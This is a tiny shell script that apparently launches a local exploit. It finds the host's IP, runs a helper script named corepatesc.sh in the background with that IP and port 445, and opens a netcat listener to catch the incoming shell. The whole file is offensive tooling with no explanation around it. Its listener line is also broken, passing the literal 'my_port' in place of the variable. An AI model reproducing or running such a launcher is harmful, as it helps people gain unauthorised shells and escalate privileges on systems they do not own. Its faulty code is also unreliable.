#!/bin/sh

my_ip=$(ifconfig | awk '/inet / {print $2; exit}' | cut -d ":" -f 2)
my_port=445

sleep 5 && ./corepatesc.sh $my_ip $my_port &

nc -nlvp my_port
